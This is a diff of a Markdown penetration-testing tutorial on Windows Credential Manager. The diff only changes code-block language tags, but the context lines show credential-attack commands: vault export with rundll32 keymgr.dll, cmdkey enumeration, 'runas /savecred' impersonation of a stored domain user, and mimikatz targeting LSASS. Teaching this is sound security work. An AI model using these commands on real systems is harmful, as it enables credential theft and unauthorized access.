@@ -23,8 +23,7 @@ Microsoft often refers to the protected stores as `Credential Lockers` (formerly
 
 It is possible to export Windows Vaults to `.crd` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.
 
-```
-        cmd
+```bat
 C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
 ```
 
@@ -34,8 +33,7 @@ C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
 
 We can use [cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) to enumerate the credentials stored in the current user's profile:
 
-```
-        cmd
+```bat
 C:\Users\sadams>whoami
 srv01\sadams
 
@@ -66,8 +64,7 @@ The first credential in the command output above, `virtualapp/didlogical`, is a 
 
 The second credential, `Domain:interactive=SRV01\mcharles`, is a domain credential associated with the user SRV01\mcharles. `Interactive` means that the credential is used for interactive logon sessions. Whenever we come across this type of credential, we can use `runas` to impersonate the stored user like so:
 
-```
-        cmd
+```bat
 C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
 Attempting to start cmd as user "SRV01\mcharles" ...
 ```
@@ -78,8 +75,7 @@ Attempting to start cmd as user "SRV01\mcharles" ...
 
 There are many different tools that can be used to decrypt stored credentials. One of the tools we can use is [mimikatz](https://github.com/gentilkiwi/mimikatz). Even within `mimikatz`, there are multiple ways to attack these credentials - we can either dump credentials from memory using the `sekurlsa` module, or we can manually decrypt credentials using the `dpapi` module. For this example, we will target the LSASS process with `sekurlsa`:
 
-```
-        cmd
+```bat
 C:\Users\Administrator\Desktop> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
